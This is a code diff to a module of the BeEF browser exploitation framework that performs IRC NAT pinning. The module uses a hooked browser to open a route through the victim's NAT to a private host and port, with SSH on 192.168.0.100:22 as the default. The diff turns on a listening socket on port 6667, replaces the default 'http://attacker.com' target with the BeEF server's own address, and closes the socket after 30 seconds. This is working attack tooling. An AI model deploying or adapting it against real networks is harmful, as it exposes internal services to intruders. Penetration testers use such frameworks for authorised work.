@@ -15,14 +15,16 @@
 #
 class Irc_nat_pinning < BeEF::Core::Command
 
-  #todo antisnatchor: reverted for now
-  #def pre_send
-  #  BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.bind_socket("IRC", "0.0.0.0", 6667)
-  #end
+  def pre_send
+    BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.bind_socket("IRC", "0.0.0.0", 6667)
+  end
 
   def self.options
+    @configuration = BeEF::Core::Configuration.instance
+    beef_host = @configuration.get("beef.http.public") || @configuration.get("beef.http.host")
+
     return [
-        {'name'=>'connectto', 'ui_label' =>'Connect to','value'=>'http://attacker.com'},
+        {'name'=>'connectto', 'ui_label' =>'Connect to','value'=>beef_host},
         {'name'=>'privateip', 'ui_label' =>'Private IP','value'=>'192.168.0.100'},
         {'name'=>'privateport', 'ui_label' =>'Private Port','value'=>'22'}
     ]
@@ -32,8 +34,9 @@ class Irc_nat_pinning < BeEF::Core::Command
     return if @datastore['result'].nil?
     save({'result' => @datastore['result']})
 
-    #todo antisnatchor: how long should we leave it open? Maybe default timeout of 30 seconds?
-    #BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.unbind_socket("IRC")
+    # wait 30 seconds before unbinding the socket. The HTTP connection will arrive sooner than that anyway.
+    sleep 30
+    BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.unbind_socket("IRC")
 
   end
   
